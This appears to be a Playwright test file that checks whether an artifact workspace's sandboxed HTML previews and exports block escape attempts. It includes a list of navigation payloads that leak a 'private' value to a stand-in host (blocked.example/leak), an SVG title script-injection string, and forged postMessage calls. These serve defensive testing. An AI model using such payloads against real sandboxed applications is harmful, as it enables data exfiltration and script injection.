import { writeFile } from "node:fs/promises";
import { pathToFileURL } from "node:url";
import { test, expect } from "@playwright/test";

const escapeAttempts = {
  data: "location.href='data:text/html;base64,'+btoa('<img src=https://blocked.example/leak>')",
  blob: "location.href=URL.createObjectURL(new Blob(['<img src=https://blocked.example/leak>'],{type:'text/html'}))",
  assign: "location.href='https://blocked.example/leak?value=private'",
  replace: "location.replace('https://blocked.example/leak?value=private')",
  refresh:
    "const meta=document.createElement('meta');meta.httpEquiv='refresh';meta.content='0;url=https://blocked.example/leak?value=private';document.head.append(meta)",
  link: "const link=document.createElement('a');link.href='https://blocked.example/leak?value=private';document.body.append(link);link.click()",
  top: "top.location.href='https://blocked.example/leak?value=private'",
};
for (const [method, code] of Object.entries(escapeAttempts)) {
  for (const exported of [false, true]) {
    test(`${exported ? "HTML exports" : "workspace previews"} block ${method} navigation before any request`, async ({
      page,
      request,
    }, testInfo) => {
      const response = await request.post("/api/artifacts", {
        data: {
          title: "Navigation test",
          content: {
            kind: "html",
            entry: "index.html",
            files: {
              "index.html": `<button id="escape">Try navigation</button><script>document.getElementById('escape').onclick=()=>{${code}};</script>`,
            },
          },
        },
      });
      expect(response.status()).toBe(201);
      const artifact = await response.json();
      const requests: string[] = [];
      await page.route("https://**/*", async (route) => {
        requests.push(route.request().url());
        await route.fulfill({
          contentType: "text/html",
          body: '<script src="https://unapproved.example/latest.js"></script>',
        });
      });
      const violations: string[] = [];
      page.on("console", (message) => {
        if (
          /Content Security Policy|Unsafe attempt|Refused to/i.test(
            message.text(),
          )
        )
          violations.push(message.text());
      });
      if (exported) {
        const html = await request.post(
          `/api/artifacts/${artifact.id}/export`,
          { data: { format: "html", revision: 1 } },
        );
        expect(html.ok()).toBe(true);
        const path = testInfo.outputPath("artifact.html");
        await writeFile(path, await html.text());
        await page.goto(pathToFileURL(path).href);
      } else {
        const workspace = await page.goto("/a/" + artifact.id);
        expect(workspace!.headers()["content-security-policy"]).toContain(
          "frame-src http://127.0.0.1:14311/preview/",
        );
      }
      const parentUrl = page.url();
      await page
        .frameLocator("iframe")
        .getByRole("button", { name: "Try navigation" })
        .click();
      await expect.poll(() => violations.length).toBeGreaterThan(0);
      expect(requests).toEqual([]);
      expect(page.url()).toBe(parentUrl);
    });
  }
}

test("preview endpoints cannot execute artifacts as top-level documents", async ({
  page,
  request,
}) => {
  const response = await request.post("/api/artifacts", {
    data: {
      title: "Direct preview",
      content: {
        kind: "html",
        entry: "index.html",
        files: {
          "index.html":
            '<script>location.href="https://blocked.example/escape"</script>',
        },
      },
    },
  });
  const artifact = await response.json();
  const requests: string[] = [];
  await page.route("https://**/*", async (route) => {
    requests.push(route.request().url());
    await route.abort();
  });
  const preview = await page.goto(
    `http://127.0.0.1:14311/preview/${artifact.id}/1`,
  );
  expect(preview!.status()).toBe(403);
  await expect(
    page.getByText("Open this artifact through the Atelier workspace."),
  ).toBeVisible();
  expect(requests).toEqual([]);
});

test("downloaded HTML preserves saved data and in-page links inside the sandbox", async ({
  page,
  request,
}, testInfo) => {
  const response = await request.post("/api/artifacts", {
    data: {
      title: "Saved data",
      content: {
        kind: "html",
        entry: "index.html",
        files: {
          "index.html": `<a href="#details">Details</a><button id="save">Save</button><output id="data"></output><div style="height:1500px"></div><h2 id="details">Details section</h2><script>
    async function show(){document.getElementById('data').textContent=JSON.stringify(await atelier.getData())}
    document.getElementById('save').onclick=async()=>{await atelier.setData({saved:true});await show()};show();
    </script>`,
        },
      },
    },
  });
  const artifact = await response.json();
  const html = await request.post(`/api/artifacts/${artifact.id}/export`, {
    data: { format: "html", revision: 1 },
  });
  const path = testInfo.outputPath("saved-data.html");
  await writeFile(path, await html.text());
  await page.goto(pathToFileURL(path).href);
  const frame = page.frameLocator("iframe");
  await expect(frame.locator("output")).toHaveText("null");
  await frame.getByRole("button", { name: "Save", exact: true }).click();
  await expect(frame.locator("output")).toHaveText('{"saved":true}');
  await page.reload();
  await expect(frame.locator("output")).toHaveText('{"saved":true}');
  await frame.getByRole("link", { name: "Details", exact: true }).click();
  await expect(
    frame.getByRole("heading", { name: "Details section" }),
  ).toBeInViewport();
  expect(page.frames()[1].url()).toBe("about:srcdoc");
  const rejected = await frame.locator("body").evaluate(async () => {
    try {
      await (window as any).atelier.setData("x".repeat(2 * 1024 * 1024));
      return false;
    } catch {
      return true;
    }
  });
  expect(rejected).toBe(true);
  await page.reload();
  await expect(frame.locator("output")).toHaveText('{"saved":true}');
});

test("an SVG title cannot inject scripts into the trusted HTML export viewer", async ({
  page,
  request,
}, testInfo) => {
  const response = await request.post("/api/artifacts", {
    data: {
      title: "Hostile SVG title",
      content: {
        kind: "svg",
        entry: "image.svg",
        files: {
          "image.svg":
            "<svg><title><script></title><script>window.exportEscaped=true</script></script></title><text>Diagram</text></svg>",
        },
      },
    },
  });
  expect(response.status()).toBe(201);
  const artifact = await response.json();
  const exported = await request.post(`/api/artifacts/${artifact.id}/export`, {
    data: { format: "html", revision: 1 },
  });
  expect(exported.ok()).toBe(true);
  const path = testInfo.outputPath("hostile-title.html");
  await writeFile(path, await exported.text());
  await page.goto(pathToFileURL(path).href);
  expect(
    await page.evaluate(() => (window as any).exportEscaped),
  ).toBeUndefined();
  await expect(page.locator("iframe")).toHaveAttribute(
    "sandbox",
    "allow-scripts",
  );
  expect(await page.locator("script").count()).toBe(1);
});

test("malformed artifact messages cannot crash the workspace or forge a selection", async ({
  page,
  request,
}) => {
  const response = await request.post("/api/artifacts", {
    data: {
      title: "Message boundary",
      content: {
        kind: "html",
        entry: "index.html",
        files: {
          "index.html": '<h1 style="margin-top:100px">Safe heading</h1>',
        },
      },
    },
  });
  const artifact = await response.json();
  await page.goto("/a/" + artifact.id);
  const frame = page.frameLocator("iframe");
  await expect(frame.locator("h1")).toBeVisible();
  await frame.locator("body").evaluate(() =>
    parent.postMessage(
      {
        atelier: true,
        type: "selection",
        anchor: { quote: "Unrequested selection" },
      },
      "*",
    ),
  );
  await expect(page.locator(".review-panel")).toHaveCount(0);
  await page.getByRole("button", { name: "Open review tools" }).click();
  await page.getByRole("button", { name: "Comment", exact: true }).click();
  await page.getByRole("button", { name: "Select a detail" }).click();
  await expect(frame.locator("html")).toHaveCSS("cursor", "crosshair");
  await frame.locator("body").evaluate(() => {
    parent.postMessage(
      {
        atelier: true,
        type: "selection",
        anchor: { quote: { malformed: true } },
      },
      "*",
    );
    parent.postMessage(
      { atelier: true, type: "runtime-error", message: { toString: null } },
      "*",
    );
  });
  await frame.locator("h1").click();
  await expect(page.locator(".selected-quote")).toContainText("Safe heading");
  await expect(
    page.getByRole("banner", { name: "Artifact toolbar" }),
  ).toBeVisible();
});
